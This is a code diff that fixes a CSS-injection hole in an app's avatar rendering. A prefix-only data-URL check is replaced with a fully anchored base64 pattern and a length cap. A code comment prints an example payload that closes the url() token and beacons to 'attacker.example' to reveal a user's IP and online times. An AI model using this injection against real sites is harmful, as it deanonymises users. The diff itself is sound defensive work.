@@ -94,7 +94,20 @@ function SkPill({ children, tint = 'clay', style = {} }) {
 // avatar is attacker-controlled. Anything that is not a data: image falls back to initials.
 // The colour is likewise interpolated into CSS, so it is restricted to a plain hex value: a crafted string
 // could otherwise smuggle url() into the gradient and beacon that way.
-const _avPhoto = (av) => (av && av.kind === 'photo' && /^data:image\//i.test(String(av.photo || ''))) ? String(av.photo) : '';
+// VALIDATE THE WHOLE STRING, NOT THE PREFIX. My first version tested /^data:image\//i and interpolated the
+// rest raw into an unquoted CSS url(). An unquoted url token ends at ')', so a member could publish
+//   data:image/png;base64,iVBORw0KGgo=) , url(https://attacker.example/beacon.png
+// and the console rendered a valid TWO-LAYER background — fetching the attacker's server and handing over the
+// steward's IP, coarse location and exact online times. The precise deanonymisation this product exists to
+// prevent, on the members list, the join requests and the chat. The comment claimed "same rule as
+// invImgDataUrl", and that was the mistake: that helper feeds <img src>, where the tail is inert. This is a
+// CSS sink. Base64's alphabet excludes ')' and whitespace, so anchoring both ends is airtight; the length cap
+// stops a member shipping a megabyte of avatar into three badges at once. AUDIT-2026-07-28.
+const _avPhoto = (av) => {
+  const v = (av && av.kind === 'photo') ? String(av.photo || '') : '';
+  if (v.length > 512 * 1024) return '';
+  return /^data:image\/(?:png|jpe?g|gif|webp|avif);base64,[A-Za-z0-9+/]+={0,2}$/i.test(v) ? v : '';
+};
 const _avColor = (av) => (av && /^#[0-9a-f]{3,8}$/i.test(String(av.color || ''))) ? String(av.color) : '';
 function SkBadge({ size = 44, radius = 13, accent = 'var(--clay)', initials = 'GC', picture = '', av = null, style = {} }) {
   const avPic = _avPhoto(av);
